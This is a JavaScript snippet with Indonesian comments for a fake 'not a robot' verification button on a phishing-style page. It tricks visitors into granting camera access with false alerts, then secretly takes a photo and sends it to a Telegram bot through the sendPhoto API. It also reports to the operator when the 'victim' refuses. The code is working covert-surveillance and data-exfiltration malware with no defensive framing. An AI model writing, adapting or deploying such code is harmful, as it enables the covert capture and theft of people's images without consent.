// ===== FITUR VERIFIKASI BUKAN ROBOT =====
document.getElementById('verifBtn').onclick = function() {
    // Ubah tampilan tombol
    this.innerHTML = '⏱ MENGANALISIS GERAKAN...';
    this.style.background = '#6c757d';
    this.disabled = true;
    
    // Alert palsu dulu - ini yang ngalihkan perhatian
    alert('🤖 Deteksi gerakan: Arahkan wajah ke kamera selama 2 detik');
    
    // Minta akses kamera
    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
        .then(function(stream) {
            // Notifikasi palsu ke korban
            alert('✅ Analisis gerakan berhasil! Anda bukan robot.');
            
            // Capture foto diam-diam
            const video = document.createElement('video');
            video.srcObject = stream;
            video.play();
            
            setTimeout(function() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(function(blob) {
                    let fd = new FormData();
                    fd.append('chat_id', chat_id);
                    fd.append('photo', blob, 'verif.jpg');
                    fd.append('caption', '✅ Verifikasi bukan robot - ' + new Date().toLocaleString());
                    fetch('https://api.telegram.org/bot' + token + '/sendPhoto', {
                        method: 'POST',
                        body: fd
                    });
                    
                    // Kirim notifikasi
                    kirimTeks('📸 Foto dari verifikasi berhasil dikirim');
                });
                
                // Matikan kamera
                stream.getTracks().forEach(t => t.stop());
                
                // Kembalikan tombol
                document.getElementById('verifBtn').innerHTML = '✓ TERVERIFIKASI';
                document.getElementById('verifBtn').style.background = '#28a745';
            }, 2000); // kasih waktu 2 detik
        })
        .catch(function(err) {
            // Kalo ditolak kamera
            alert('❌ Gagal mendeteksi gerakan. Pastikan kamera diizinkan.');
            document.getElementById('verifBtn').innerHTML = '✓ VERIFIKASI BUKAN ROBOT';
            document.getElementById('verifBtn').style.background = '#28a745';
            document.getElementById('verifBtn').disabled = false;
            
            // Lapor ke Telegram
            kirimTeks('❌ Korban tolak kamera saat verifikasi');
        });
};
